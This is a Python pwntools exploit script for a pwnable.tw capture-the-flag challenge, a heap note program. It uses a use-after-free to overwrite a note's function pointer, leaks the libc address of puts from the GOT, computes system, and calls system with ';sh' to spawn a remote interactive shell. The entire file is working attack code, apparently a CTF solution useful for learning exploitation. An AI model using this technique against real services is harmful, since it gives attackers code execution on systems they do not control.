from pwn import *

context.arch = 'i386'

host = 'chall.pwnable.tw'
port = 10102
# host = '127.0.0.1'
# port = 8888
r = remote(host, port)

# input('Press Enter to start.')

def add_note(size, content):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    if len(content) == size:
        r.send(content)
    else:
        r.sendline(content)

def delete_note(index):
    r.recvuntil(':')
    r.sendline(b'2')
    r.recvuntil(':')
    r.sendline(str(index).encode())

def print_note(index):
    r.recvuntil(':')
    r.sendline(b'3')
    r.recvuntil(':')
    r.sendline(str(index).encode())

# struct_note = 0x804a050
print_note_content = 0x0804862b
puts_got = 0x0804a024
puts_off = 0x5f140
system_off = 0x3ada0
old_bin_sh = 0xf76839ab
old_puts = 0xf7587ca0
old_system = 0xf7562da0

add_note(0x50, b'aaaaaaaa') #0
add_note(0x50, b'bbbbbbbb') #1
delete_note(0)
delete_note(1)

add_note(0x8, p32(print_note_content)+p32(puts_got)) #2
print_note(0)
puts = u32(r.recvn(4))
print('puts =', hex(puts))
r.recvuntil('\n')
libc = puts - puts_off
system = libc + system_off
# system = old_system + puts - old_puts
print('system =', hex(system))

delete_note(2)
add_note(0x8, p32(system)+b';sh')
print_note(0)

r.interactive()
